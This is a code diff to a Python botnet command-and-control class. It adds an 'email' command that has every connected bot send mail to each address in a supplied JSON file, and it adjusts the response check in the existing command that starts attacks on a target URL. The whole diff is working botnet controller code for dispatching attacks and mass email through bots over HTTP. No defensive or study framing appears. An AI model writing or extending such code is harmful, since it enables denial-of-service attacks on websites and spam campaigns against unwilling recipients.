@@ -24,8 +24,9 @@ class CnC:
             'status': {'fun': self.__status, 'desc': self.__status.__doc__, 'args': True},
             'start': {'fun': self.__start, 'desc': self.__start.__doc__, 'args': True},
             'stop': {'fun': self.__stop, 'desc': self.__stop.__doc__, 'args': False},
+            'email': {'fun': self.__email, 'desc': self.__email.__doc__, 'args': True},
             'exit': {'fun': self.__exit, 'desc': self.__exit.__doc__, 'args': False}
-        }  # TODO email batch
+        }
         self.__lock = threading.Lock()  # lock for thread-safe access to attributes
 
         self.__socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -151,8 +152,8 @@ class CnC:
                     requests.post(f"http://{address}:{port}/start", json={'url': url}).status_code
                     for address, port in self.__bots.items()
                 })
-            if len(responses) == 1 and responses.pop() != 200:
-                return colored("Attack did not start...", "red")
+        if len(responses) == 1 and responses.pop() != 200:
+            return colored("Attack did not start...", "red")
         return colored("Attack started successfully!", "green")
 
     def __stop(self):
@@ -172,6 +173,23 @@ class CnC:
         if code == 406:
             return colored("There isn't any attack running", "yellow")
         return colored("Attack stopped successfully!", "green")
+
+    def __email(self, file):
+        """
+        Makes all the bot connected email every address stored in the given file.
+        """
+        with self.__lock:
+            if len(self.__bots) == 0:
+                return colored("No bot connected.", 'red')
+            with open(file[0], 'r') as f:
+                emails = json.load(f)
+            responses = {
+                requests.post(f"http://{address}:{port}/email", json={'url': emails}).status_code
+                for address, port in self.__bots.items()
+            }
+        if len(responses) == 1 and responses.pop() != 200:
+            return colored("Emails were not sent...", "red")
+        return colored("Emails sent successfully!", "green")
 
     def __exit(self) -> str:
         """
